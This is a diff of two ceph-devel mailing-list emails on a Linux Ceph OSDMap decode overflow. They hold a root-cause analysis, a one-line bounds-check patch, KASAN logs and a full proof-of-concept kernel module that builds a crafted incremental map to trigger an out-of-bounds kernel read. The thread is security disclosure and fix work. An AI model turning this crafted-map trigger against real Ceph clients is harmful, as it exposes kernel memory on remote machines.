@@ -1,77 +1,80 @@
-Received: from mail-yx1-f51.google.com (mail-yx1-f51.google.com [74.125.224.51])
+Received: from mail-yw1-f181.google.com (mail-yw1-f181.google.com [209.85.128.181])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 63B2E2236E3
-	for <ceph-devel@vger.kernel.org>; Sat, 25 Jul 2026 03:24:47 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.51
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4C9DC2D3739
+	for <ceph-devel@vger.kernel.org>; Sat, 25 Jul 2026 06:14:12 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.181
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784949889; cv=none; b=JsdGJUG3eFuDA3V5MAvtrgtPbSqTA53uI3f1ZjPS8ryvdaVvTc8fnnlndKbhYClLcM6ZiOP1ayX+Ur64NgYLUgNIPYCSOF2RgH+/RHsUrGpLVJX61cC9FREwBarTRMvInm1m8Cs9TcSq1vplm5A/idUm29fXut/8YpwqYPoCKio=
+	t=1784960054; cv=none; b=hr+pMrBD4XgWxbzoR0lVpwk82VIB7Ug9tfbMCHYwJuo4M7z+3rykDe00rmeLlppZ7vDHV/lUCebLSqingNLjnWVYHDdnQFIvOMYhXQ7OmxpcIkcCbkgT1wDKZqrf7gbH4KSo+k9F3egbP97y6WBmRfMdCsDCYT5U/AhLqbXfsbs=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784949889; c=relaxed/simple;
-	bh=tsLiIK43y2s0eVjPv8v9ykq+nV0rcEE/UbexcgxIQpE=;
+	s=arc-20240116; t=1784960054; c=relaxed/simple;
+	bh=Whv/mFYgyjptOkN5OtDwR6Q0P1uflh4o4UWU2gjuaF0=;
 	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
-	 Content-Type:MIME-Version; b=J+ETCB0rnpiwa3G9GiSmddk2Es2UP5NoRCk0/clUYY8jBPgUDZV4v+aO/1jVTPEAH6gLUSy6nZs8vqmuRdiK450p9g7Al0L3ItQTnmyGEQanMUQLnNPCehbkW9w4zJNgOnxtLBwI1WF4REFs7kSlgeR2IHBgkgAbjnQRnG2rdbg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=dubeyko.com; spf=pass smtp.mailfrom=dubeyko.com; dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b=FrxH4oOy; arc=none smtp.client-ip=74.125.224.51
+	 Content-Type:MIME-Version; b=rq08TGelxGmNUdzDvHQ+dbM7n6/9im+UjRvjL6Lf7J2yaziudJot2IBSlekQfkhslWBDzsp1Re98zXyf8iW30xqIz2QJ1y4sTh2/URbqmxQ2w2vywYxBSOYXqSaFUhftkKaDZEbUSaPHOuLqvmcdfgM76zvH6VbM0jFSJlCmcp4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=dubeyko.com; spf=pass smtp.mailfrom=dubeyko.com; dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b=QdoRlJtS; arc=none smtp.client-ip=209.85.128.181
 Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=dubeyko.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=dubeyko.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b="FrxH4oOy"
-Received: by mail-yx1-f51.google.com with SMTP id 956f58d0204a3-6682259cae6so865197d50.3
-        for <ceph-devel@vger.kernel.org>; Fri, 24 Jul 2026 20:24:47 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=dubeyko-com.20251104.gappssmtp.com header.i=@dubeyko-com.20251104.gappssmtp.com header.b="QdoRlJtS"
+Received: by mail-yw1-f181.google.com with SMTP id 00721157ae682-81e9f7491ffso12175417b3.0
+        for <ceph-devel@vger.kernel.org>; Fri, 24 Jul 2026 23:14:12 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=dubeyko-com.20251104.gappssmtp.com; s=20251104; t=1784949886; x=1785554686; darn=vger.kernel.org;
+        d=dubeyko-com.20251104.gappssmtp.com; s=20251104; t=1784960051; x=1785564851; darn=vger.kernel.org;
         h=mime-version:user-agent:content-transfer-encoding:content-type
          :autocrypt:references:in-reply-to:date:cc:to:from:subject:message-id
          :from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=tsLiIK43y2s0eVjPv8v9ykq+nV0rcEE/UbexcgxIQpE=;
-        b=FrxH4oOy/r4p9FTAqL7QC6TsuGXugJk9Ex/2VNm8Q8K6wuVDrNDEOPGwQjtFPfNp0a
-         MOMfxDkYlW6LhiiIJtz6wT8yMdcT24/NKiGANAkzOhJq9AtxZPT3Y8OTbZ54TL5iJeoZ
-         0hXrxWdExh8SZXkphrSGH0QRV9ysn42Z+RcQLpcM6tFIsue2OrAu4Yz19of0u3/te6j5
-         LX6Cky3vm9U/irrGjr6OSzNi0iwZXrhFmnCcoRdZiSOGuJGPFZmXZoDzDaeE8FSg7PUv
-         LNb7HuhKmFSjcYSLwbn8EghxP8Ln1qs3zCyp22AYXwV9Qu+4Eo1zS9bpRGxa4t5S4zDJ
-         67qA==
+        bh=n42nRWODHRGfjLQrHku0tYCI4eryOw47MbaSBNtB1ow=;
+        b=QdoRlJtSoSOQeWfZBTUmoXeW6+Nf4wCJai5nQfygAn2QnTa241H/9oAnZTBTax3OEj
+         hiFogmfbiuh4TWJQ6p1dFOwpln8z4sFTx3knefcJ++zpGdGiSzP33zj4tOjjrrcfNWcx
+         U3ZjF+WWtPeIQKZOdnP8IfKJntmkBvnQcGCuX2QCocZPiju7/bH84DKyqkXNalGIw/RK
+         EhvJ8sc6Zo7MQ5jnI54JEEj1MlCYe0PoZnHO4/UMrR0aPmKi72JY6OA8cTNCjlJzNflD
+         4Vgnb3o5iffIMowAbs/XrFT0Ay94QH40Hm5COIfEyk+lVz7EjHTa8fM6Isv+wnvf9Ve2
+         gAHQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784949886; x=1785554686;
+        d=1e100.net; s=20251104; t=1784960051; x=1785564851;
         h=mime-version:user-agent:content-transfer-encoding:content-type
          :autocrypt:references:in-reply-to:date:cc:to:from:subject:message-id
          :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
          :reply-to:content-type;
-        bh=tsLiIK43y2s0eVjPv8v9ykq+nV0rcEE/UbexcgxIQpE=;
-        b=ABMkIDCkH1OBhzbH5xb2DU4B5TpuKT+YWgN2c4WoAa/83+WRllrOxRtJRN9g4poO5j
-         EF3qnAztOnLk2o3raYwwJDt43D8jPCdBlJ8KMqj1RrKbm4MyHsCFYhrsjRlfBefkQH/a
-         Mmiotew5KzPYo9mZkaV+j+2Vkl2FAoUjaKw8p1gzSkDQnQ2iJvTeVq5cdEUfc6eoGYym
-         ETnYyuupiT1gNDeaSGColJ6hLNLfeIUrM6P1EW2QHPYAUYr5JVE//FSMMZ0EzvYmC2Af
-         e9+YJFGejQKjGxjHRa9Fh8j/yweFxH3SY8FdZNCP+bLyoB/Sny5ucftB7dnLLu3fEIlc
-         DPvw==
-X-Gm-Message-State: AOJu0Yy3djhYXEQttCm/2+QwnK3e1cC9pUl0vyBM719BluAfeQtWaUH+
-	p9Ytg9Vy9zFv844TuuVuM3xhqmfQfQALVnImNcOvLVSV/HV9gN3zjMeoP6NWWQwvz1Q=
-X-Gm-Gg: AR+sD13Lz9t1SqMdOuhSBRaGokY+2nJRAVGwHkAgXzs3g4jaYazVVHQNZBqOxeR88XA
-	fhi3UetPHWZ6bbG+HdKGiQ0oWMWjqzhAMQZAgJJJqjF01gJXaGdjhe+4VbzXs3FbDT7+lMRPVHf
-	1VF1pxk1zvriEKr3iSENSTy3JstcjImjGXjoZtkMvsR0AndnsaTLKooKMoGjqlVORx14VxEuSOI
-	2VXiNMWZ8lSvv1PPbeVkc8fza0Sm1+tol7XgIdJxlJGrkuSZrdJQ3s3GQGODA7BBpMSTsDEuRTc
-	ZtcAeVd9w8IcVyPRvCfob27PP0jyb7ROyLdTnmEL3/30v3acTMSJqCMUfkqZ1wwFg6AdslEKB6T
-	3NExhrnIZYTO8dCpWEXdd2U2qfN8iqxIIWp1KqQN/1XQe0GbUJmhzwH1L9iFm10r3RQoLvV7T1g
-	eLWtIj4ArPjA8Pu0gmso/qrYSO/80e1opyMHoc9hDjXWfICvzRek+ILH9Qti9iFZbKfei6tJmMk
-	K7Ymq6t0sOu5SVYqiek+iE8EvV05qCcVpooPU52Jhkxj64HRWu/WRVsurPAeQmIKW9OlxMItGxj
-	42wHnA==
-X-Received: by 2002:a05:690e:13cc:b0:667:b314:aeba with SMTP id 956f58d0204a3-668c786f3a7mr259316d50.5.1784949886202;
-        Fri, 24 Jul 2026 20:24:46 -0700 (PDT)
+        bh=n42nRWODHRGfjLQrHku0tYCI4eryOw47MbaSBNtB1ow=;
+        b=B7jIWYufqVny3RDfQrQHz5PX2ZMxe8v2EBehad87S6BsgBamEdLD9sux1N+XMKvk/T
+         f5a+nSS2z+KB0fyt4MkVNRCiMSeo19ts2cGqNGQ9M1NrChYOZVG0+DV1HD4AEcY9Hgd2
+         wzvt1fam3r3oiluVONRnZmuSSK0XYUN68xxG/vy3n6IIgUtVVO9pqpams4ttL24VkO+r
+         LJM1vLdD8/IRgIYGAV+joZgnGfFuLReMMSt/0FMY9/cBLb96Qrlj3VWBy5bRadgic65t
+         7Mjx/1jn0bPFNOY8L43tw3wqP5VTiX8wzK1XN+oapwmIvq6X06lpE2tiEDCl/2ytcbmd
+         V1BQ==
+X-Forwarded-Encrypted: i=1; AHgh+RrMXcwyJ32nif3bKmq3uok1Erpax6pm71MC65L4e3jzzH37EjauLWJUeO5q+xJYqEJkHDF8btitXsfL@vger.kernel.org
+X-Gm-Message-State: AOJu0YymMYqs8/wQRJmd96Pk5QQXaJZ5jjWC+zpGZ/jUCoyNaqgoBQdb
+	guo66rR7KJnUdZx8vHNqAIWEm3TpZnFUljHK7fgXFL3ic2J0/o4XTG/S8+US+a+aK7o=
+X-Gm-Gg: AR+sD12TabxzsfvfnYL1ad0S941zfCy1L7ACyvu0Ny0KpZHijaf6K1BWhN83xx/laeK
+	f6igRjP2b6QjLEtpOgd41RL8BG9SOIHUWVbR+TT8B7Bzcc0USMgx+JGN5vCcjphzq4oCbbZF0zB
+	BpoMYt0s8uv6MWekeTfPaN647z/LweCswtZ58hl/UBt78zG/P6tCpAfnC2ZLYyFboxU7guPd9gf
+	aTjkbu71UfEvWa4NyzFB+tmN+OVUEnNFWdZSoz2XJrhH4mN0L8z5YQG2SLFk7Yf24fBpPU0lIdO
+	CxuycrDlsK95IEE9syX+ALHsq9KZx38fvk+srKFhieaDj3K8JupOvkrcnTKJO0WmAsQg8VW2kx5
+	SvFryH951t/wkb1iEQqRizDDjcCbdjX3PFCYvqwqqXpWgWm3KdPSef+Bf534lJeDExU4pzbDsOa
+	IRfeGvFBMy45HKs6TcYMRH48yylLMsD8I1iIuDlg4efM1dKuQ9CgSFsYq4FQbCoApJhEHCMPOwz
+	XKBliZSOsVZnJYc0pvMyoZhIHIP+XTpmilO/hUg74waPc8HGz8o7P3HPZbuVAOt0QmbQybxANyO
+	jTfwAQ==
+X-Received: by 2002:a05:690c:9689:b0:81e:d8ec:d855 with SMTP id 00721157ae682-81f69e8501amr4671877b3.62.1784960051133;
+        Fri, 24 Jul 2026 23:14:11 -0700 (PDT)
 Received: from ?IPv6:2600:1700:6476:1430:62ee:74f6:cfbb:28e0? ([2600:1700:6476:1430:62ee:74f6:cfbb:28e0])
-        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-668c6d3024dsm345583d50.4.2026.07.24.20.24.44
+        by smtp.gmail.com with ESMTPSA id 00721157ae682-81f658fda9fsm9008437b3.39.2026.07.24.23.14.07
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 24 Jul 2026 20:24:44 -0700 (PDT)
-Message-ID: <89b78fe1d23d6a05567e51f83efae1258ac0ad97.camel@dubeyko.com>
+        Fri, 24 Jul 2026 23:14:09 -0700 (PDT)
+Message-ID: <588302e854ade46991dc0516b9832ea7669f3aa8.camel@dubeyko.com>
 Subject: Re: [Security][Ceph] OSDMap new_state decode overflow causes
  out-of-bounds read in kernel client
 From: Viacheslav Dubeyko <slava@dubeyko.com>
-To: Federico Kirschbaum <federico.kirschbaum@xbow.com>, Ilya Dryomov
-	 <idryomov@gmail.com>, Alex Markuze <amarkuze@redhat.com>, Baul Lee
-	 <baul.lee@xbow.com>
-Cc: ceph-devel@vger.kernel.org
-Date: Fri, 24 Jul 2026 20:24:43 -0700
-In-Reply-To: <CALhuxzfVV=O7z_at9wf0HeU1Mk8fvi_1OHhH1M3Conv9ae6sJw@mail.gmail.com>
+To: Baul Lee <baul.lee@xbow.com>
+Cc: Ilya Dryomov <idryomov@gmail.com>, Alex Markuze <amarkuze@redhat.com>, 
+	ceph-devel@vger.kernel.org
+Date: Fri, 24 Jul 2026 23:14:04 -0700
+In-Reply-To: <CAEM_DMEY7LqEA5a_YM+58HkHBnWfCk1BfAnzZ9XZzqOmbuCxTw@mail.gmail.com>
 References: 
 	<CALhuxzfVV=O7z_at9wf0HeU1Mk8fvi_1OHhH1M3Conv9ae6sJw@mail.gmail.com>
+	 <89b78fe1d23d6a05567e51f83efae1258ac0ad97.camel@dubeyko.com>
+	 <CAEM_DMHARz62F-Ow0vM6PdKnGcShhY3HjHOZFgSV34QM9VH5gw@mail.gmail.com>
+	 <CAEM_DMEY7LqEA5a_YM+58HkHBnWfCk1BfAnzZ9XZzqOmbuCxTw@mail.gmail.com>
 Autocrypt: addr=slava@dubeyko.com; prefer-encrypt=mutual;
  keydata=mQINBGgaTLYBEADaJc/WqWTeunGetXyyGJ5Za7b23M/ozuDCWCp+yWUa2GqQKH40dxRIR
  zshgOmAue7t9RQJU9lxZ4ZHWbi1Hzz85+0omefEdAKFmxTO6+CYV0g/sapU0wPJws3sC2Pbda9/eJ
@@ -126,121 +129,118 @@ List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 
-Hi Federico,
-
-Please, send a formal patch to ceph-devel@vger.kernel.org. I have no
-means to review attachments and I never open email's attachment from
-the unknown persons. So, please, send the patch in plain text.
-
-Thanks,
-Slava.
-
-On Sat, 2026-07-25 at 00:19 -0300, Federico Kirschbaum wrote:
-> Hi,
+On Sat, 2026-07-25 at 14:47 +0900, Baul Lee wrote:
+> fix.patch
+> --- a/net/ceph/osdmap.c
+> +++ b/net/ceph/osdmap.c
+> @@ -1902,6 +1902,7 @@ static int decode_new_up_state_weight(void **p,
+> void *end, u8 struct_v,
+> =C2=A0 s32 osd;
+> =C2=A0 u32 xorstate;
+> =C2=A0
+> + ceph_decode_need(p, end, sizeof(u32) + (struct_v >=3D 5 ? sizeof(u32)
+> : sizeof(u8)), e_inval);
+> =C2=A0 osd =3D ceph_decode_32(p);
+> =C2=A0 if (osd >=3D map->max_osd)
+> =C2=A0 goto e_inval;
+> poc.c
+> // SPDX-License-Identifier: GPL-2.0
+> #include <linux/module.h>
+> #include <linux/kernel.h>
+> #include <linux/slab.h>
+> #include <linux/mm.h>
+> #include <linux/ceph/osdmap.h>
+> #include <linux/ceph/decode.h>
 >=20
-> We would like to report a remotely triggerable OSDMap decoding issue
-> in the Linux Ceph client that can cause an out-of-bounds read when
-> processing crafted incremental maps.
+> static void put8(u8 **q, u8 v) =C2=A0 { **q =3D v; *q +=3D 1; }
+> static void put32(u8 **q, u32 v) { __le32 le =3D cpu_to_le32(v);
+> memcpy(*q, &le, 4); *q +=3D 4; }
+> static void put64(u8 **q, u64 v) { __le64 le =3D cpu_to_le64(v);
+> memcpy(*q, &le, 8); *q +=3D 8; }
 >=20
-> Summary
-> decode_new_up_state_weight() decodes an incremental OSDMap in two
-> passes. In the first "skip" pass it multiplies the monitor-supplied
-> new_state entry count by the per-entry size and stores the product
-> back into a u32, where a count large enough that count * per-entry-
-> size overflows u32 truncates the product =E2=80=94 so the ceph_decode_nee=
-d()
-> length guard is satisfied for a zero-sized region and the pointer is
-> never advanced. The second pass then re-reads the true (large) count
-> and walks the new_state array with no per-iteration bounds check,
-> unlike the sibling new_weight loop directly above it. A kernel client
-> that mounts CephFS or maps an rbd image from that monitor receives
-> the crafted incremental map over the wire and the decode walks *p off
-> the end of the message buffer. Confirmed under a KASAN VM against the
-> unmodified decode path.
+> #define MAXOSD 8u
 >=20
-> Root Cause Analysis
-> net/ceph/osdmap.c =E2=80=94 decode_new_up_state_weight(). The first pass
-> reads the new_state count and skips over it:
+> static int __init poc_init(void)
+> {
+> =C2=A0struct ceph_osdmap *map, *ret;
+> =C2=A0u8 *buf, *q;
+> =C2=A0void *p, *end;
+> =C2=A0size_t len;
+> =C2=A0int i;
 >=20
-> =C2=A0new_state =3D *p;
-> =C2=A0ceph_decode_32_safe(p, end, len, e_inval); /* [1] len =3D Ns (u32),
-> attacker-controlled */
-> =C2=A0len *=3D sizeof(u32) + (struct_v >=3D 5 ? sizeof(u32) : sizeof(u8))=
-; /*
-> [2] product truncated back into u32 len */
-> =C2=A0ceph_decode_need(p, end, len, e_inval); /* [3] guard checks the
-> truncated (small) len */
-> =C2=A0*p +=3D len;
-> [1] len is u32 and comes straight from the message; struct_v >=3D 5
-> selects a per-entry size of sizeof(u32) + sizeof(u32) =3D 8.
-> [2] sizeof(...) is size_t, so the multiply is evaluated in 64-bit,
-> but the result is assigned back into the 32-bit len. A count Ns large
-> enough that Ns * 8 exceeds 0xFFFFFFFF truncates the product back to a
-> small value (a whole 32-bit multiple truncates to 0) in len.
-> [3] ceph_decode_need(p, end, 0) therefore always succeeds and *p +=3D 0
-> =E2=80=94 the length guard that is supposed to prove the whole new_state
-> array is present in the buffer has been defeated, and the saved
-> new_state pointer still refers to the true (huge) count.
-> The second pass rewinds to that pointer, re-reads the true count, and
-> iterates with no bounds check:
+> =C2=A0map =3D ceph_osdmap_alloc();
+> =C2=A0if (!map)
+> =C2=A0return -ENOMEM;
 >=20
-> =C2=A0/* new_state (up/down) */
-> =C2=A0*p =3D new_state;
-> =C2=A0len =3D ceph_decode_32(p); /* [4] re-reads the TRUE (large) Ns */
-> =C2=A0while (len--) {
-> =C2=A0s32 osd;
-> =C2=A0u32 xorstate;
->=20
-> =C2=A0osd =3D ceph_decode_32(p); /* [5] read osd id ... */
-> =C2=A0if (osd >=3D map->max_osd)
-> =C2=A0goto e_inval;
->=20
-> =C2=A0if (struct_v >=3D 5)
-> =C2=A0xorstate =3D ceph_decode_32(p); /* [6] ... then read xorstate =E2=
-=80=94 no
-> ceph_decode_need */
-> =C2=A0else
-> =C2=A0xorstate =3D ceph_decode_8(p);
-> =C2=A0...
+> =C2=A0len =3D 12 + (16+4+8+8+4) + (4+4+4) + (4+4+4) + (4+4+4);
+> =C2=A0buf =3D kvmalloc(len, GFP_KERNEL);
+> =C2=A0if (!buf) {
+> =C2=A0ceph_osdmap_destroy(map);
+> =C2=A0return -ENOMEM;
 > =C2=A0}
-> [4] The loop trip count is the untruncated Ns, so the loop intends to
-> consume Ns * 8 bytes that [3] never proved are present.
-> [5]/[6] Each iteration advances *p by 8 bytes with no
-> ceph_decode_need(p, end, ...). This is the sole difference from the
-> new_weight loop immediately above it, which performs
-> ceph_decode_need(p, end, 2*sizeof(u32), e_inval) on every iteration
-> and is therefore safe. Once *p reaches end, the ceph_decode_32() at
-> [5]/[6] reads past the end of the message buffer.
-> The osd >=3D map->max_osd check at [5] does not contain the walk: the
-> over-read is the next ceph_decode_32() on the same or a following
-> iteration, and while the in-buffer trailing bytes decode to small osd
-> ids (< max_osd) the loop keeps advancing and reading past end before
-> any osd value happens to exceed max_osd.
-> KASAN report (VM-confirmed)
-> Device: mainline Linux 7.2.0-rc2 (origin/master 0e35b9b6ec0f), arm64,
-> built with CONFIG_KASAN_GENERIC=3Dy CONFIG_KASAN_VMALLOC=3Dy
-> CONFIG_CEPH_LIB=3Dm, booted under a QEMU virt VM (the running kernel
-> reports the module vermagic 7.0.0). The crafted incremental-OSDMap
-> bytes are the exact byte stream handle_one_map() decodes off the
-> wire; they are delivered to the unmodified osdmap_apply_incremental()
-> =E2=86=92 decode_new_up_state_weight() via a small out-of-tree module
-> (poc/poc.c). The vulnerable function body is byte-for-byte identical
-> to the pristine tree (verified by md5sum of the function); the only
-> source edits are three EXPORT_SYMBOL lines added outside the function
-> (ceph_osdmap_alloc, ceph_osdmap_destroy, osdmap_apply_incremental) so
-> the already header-declared helpers are loadable-module-callable.
-> Full log in evidence/kasan_oob.log.
+> =C2=A0q =3D buf;
+>=20
+> =C2=A0put8(&q, 7); put8(&q, 7); put32(&q, 0);
+> =C2=A0put8(&q, 7); put8(&q, 1); put32(&q, 0);
+>=20
+> =C2=A0for (i =3D 0; i < 16; i++)
+> =C2=A0put8(&q, 0);
+> =C2=A0put32(&q, 1);
+> =C2=A0put32(&q, 0); put32(&q, 0);
+> =C2=A0put64(&q, (u64)-1);
+> =C2=A0put32(&q, (u32)-1);
+> =C2=A0put32(&q, 0);
+> =C2=A0put32(&q, 0);
+> =C2=A0put32(&q, MAXOSD);
+> =C2=A0put32(&q, 0);
+> =C2=A0put32(&q, 0);
+> =C2=A0put32(&q, 0);
+>=20
+> =C2=A0put32(&q, 0);
+> =C2=A0put32(&q, 0x20000000u);
+> =C2=A0put32(&q, 0);
+>=20
+> =C2=A0BUG_ON((size_t)(q - buf) !=3D len);
+>=20
+> =C2=A0p =3D buf;
+> =C2=A0end =3D buf + len;
+> =C2=A0ret =3D osdmap_apply_incremental(&p, end, false, map);
+> =C2=A0if (!IS_ERR(ret))
+> =C2=A0map =3D ret;
+> =C2=A0ceph_osdmap_destroy(map);
+> =C2=A0kvfree(buf);
+> =C2=A0return 0;
+> }
+>=20
+> static void __exit poc_exit(void) { }
+>=20
+> module_init(poc_init);
+> module_exit(poc_exit);
+> MODULE_LICENSE("GPL");
+> MODULE_DESCRIPTION("KASAN PoC: ceph decode_new_up_state_weight OOB
+> read");
+> KASAN
+> Linux 7.2.0-rc2 (origin/master 0e35b9b6ec0f), arm64, CONFIG_KASAN=3Dy
+> CONFIG_CEPH_LIB=3Dm. QEMU virt.
+> Reproducer: poc/poc.c (minimized) feeds a crafted incremental OSDMap
+> to the unmodified
+> osdmap_apply_incremental() -> decode_new_up_state_weight() path (the
+> exact bytes a malicious
+> ceph monitor's MSG_OSD_MAP would decode); the vulnerable function is
+> byte-for-byte unmodified.
 >=20
 > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 > BUG: KASAN: slab-out-of-bounds in
 > decode_new_up_state_weight+0x3f8/0x900 [libceph]
-> Read of size 4 at addr ffff000019d1b2e4 by task insmod/267
+> Read of size 4 at addr ffff000019a51264 by task insmod/241
 >=20
-> CPU: 0 UID: 0 PID: 267 Comm: insmod Tainted: G =C2=A0 =C2=A0B =C2=A0 =C2=
+> CPU: 1 UID: 0 PID: 241 Comm: insmod Tainted: G =C2=A0 =C2=A0B =C2=A0 =C2=
 =A0 =C2=A0OE =C2=A0 =C2=A0 =C2=A0
-> 7.0.0 #5
+> 7.0.0 #5 PREEMPT(lazy)
+> Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE, [E]=3DUNSIGNED_MODULE
+> Hardware name: linux,dummy-virt (DT)
 > Call trace:
 > =C2=A0show_stack+0x24/0x50 (C)
 > =C2=A0dump_stack_lvl+0x80/0xc0
@@ -250,80 +250,186 @@ d()
 > =C2=A0__asan_loadN+0x20/0x48
 > =C2=A0decode_new_up_state_weight+0x3f8/0x900 [libceph]
 > =C2=A0osdmap_apply_incremental+0x3d4/0xa28 [libceph]
-> =C2=A0poc_init+0x270/0xf68 [ceph_osdmap_poc]
+> =C2=A0poc_init+0x23c/0xf70 [ceph_osdmap_poc]
 > =C2=A0do_one_initcall+0xb4/0x6a0
+> =C2=A0do_init_module+0x1c4/0x4c8
+> =C2=A0load_module+0x30b4/0x37e8
+> =C2=A0init_module_from_file+0x190/0x1f8
+> =C2=A0__arm64_sys_finit_module+0x304/0x4e0
+> =C2=A0invoke_syscall.constprop.0+0xa8/0x188
+> =C2=A0el0_svc_common.constprop.0+0x80/0x178
+> =C2=A0do_el0_svc+0x3c/0x70
+> =C2=A0el0_svc+0x44/0x140
+> =C2=A0el0t_64_sync_handler+0xc0/0x110
+> =C2=A0el0t_64_sync+0x1b8/0x1c0
 >=20
-> Allocated by task 267:
+> Allocated by task 241:
+> =C2=A0kasan_save_stack+0x44/0x88
+> =C2=A0kasan_save_track+0x24/0x58
+> =C2=A0kasan_save_alloc_info+0x48/0x90
+> =C2=A0__kasan_kmalloc+0xd8/0x110
 > =C2=A0__kvmalloc_node_noprof+0x23c/0x7f0
-> =C2=A0poc_init+0xd4/0xf68 [ceph_osdmap_poc]
+> =C2=A0poc_init+0xb4/0xf70 [ceph_osdmap_poc] =C2=A0 =C2=A0 =C2=A0 =C2=A0<-=
+ the crafted 88-byte
+> inc-osdmap buffer
 >=20
-> The buggy address belongs to the object at ffff000019d1b280
-> =C2=A0which belongs to the cache kmalloc-rnd-10-96 of size 96
+> The buggy address belongs to the object at ffff000019a51200
+> =C2=A0which belongs to the cache kmalloc-rnd-08-96 of size 96
 > The buggy address is located 12 bytes to the right of
-> =C2=A0allocated 88-byte region [ffff000019d1b280, ffff000019d1b2d8)
+> =C2=A0allocated 88-byte region [ffff000019a51200, ffff000019a51258)
 > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-> libceph: corrupt inc osdmap (-22) epoch 1 off 104
-> The faulting Read of size 4 at object +88+12 is the xorstate =3D
-> ceph_decode_32(p) at [6], reading past end of the 88-byte
-> incremental-OSDMap buffer allocated by the harness
-> (__kvmalloc_node_noprof from poc_init).
-> The PC decode_new_up_state_weight+0x3f8, called from
-> osdmap_apply_incremental+0x3d4, is the new_state loop; the trailing
-> corrupt inc osdmap (-22) ... off 104 is the loop finally bailing at
-> e_inval after it has already over-read the 88-byte region out to
-> offset 104.
-> Impact
-> A sequential kernel-heap out-of-bounds read walking *p past the end
-> of the incremental-OSDMap message buffer. Both the read length =E2=80=94 =
-the
-> untruncated new_state count that drives the loop =E2=80=94 and the
-> incremental-OSDMap message buffer size are controlled by the ceph
-> monitor, and no per-iteration bound stops the walk. The libceph front
-> buffer is kvmalloc'd up to CEPH_MSG_MAX_FRONT_LEN (16 MiB); when a
-> large front is backed by vmalloc the over-read crosses adjacent
-> kernel memory and a guard page. A single crafted MSG_OSD_MAP over the
-> wire reaches this decode in every kernel client that mounts CephFS or
-> maps an rbd image from that monitor. This is a monitor-controlled,
-> remotely-reachable kernel memory-safety violation (CWE-125) =E2=80=94 an =
-out-
-> of-bounds read / information-disclosure-class primitive over adjacent
-> kernel-heap bytes past the message buffer.
 >=20
-> Patch
-> Add the missing per-iteration bounds check at the top of the
-> new_state loop, mirroring the sibling new_weight loop, so each 8-byte
-> (struct_v >=3D 5) or 5-byte entry is proven present before it is
-> decoded. This directly and minimally closes the walk regardless of
-> the first-pass truncation. As a defence in depth the skip-pass length
-> should also be accumulated in a type wide enough not to truncate
-> (e.g. compute the product as size_t and compare against end - *p), so
-> the guard at [3] is not silently satisfied by a wrapped length.
->=20
-> =C2=A0/* new_state (up/down) */
-> =C2=A0*p =3D new_state;
-> =C2=A0len =3D ceph_decode_32(p);
-> =C2=A0while (len--) {
-> =C2=A0s32 osd;
-> =C2=A0u32 xorstate;
->=20
-> =C2=A0ceph_decode_need(p, end,
-> =C2=A0sizeof(u32) + (struct_v >=3D 5 ? sizeof(u32) : sizeof(u8)),
-> =C2=A0e_inval);
-> =C2=A0osd =3D ceph_decode_32(p);
-> =C2=A0if (osd >=3D map->max_osd)
-> =C2=A0goto e_inval;
-> =C2=A0...
-> =C2=A0}
-> Full diff in patch/fix.patch (applies cleanly to origin/master
-> 0e35b9b6ec0f). With the per-iteration ceph_decode_need() in place the
-> new_state loop can no longer read past end =E2=80=94 exactly like the sib=
-ling
-> new_weight loop that was already guarded =E2=80=94 so the crafted increme=
-ntal
-> map is rejected with -EINVAL instead of walking off the buffer.
->=20
-> Credit
->=20
-> Discovered by XBOW, triaged by Baul Lee <baul.lee@xbow.com>
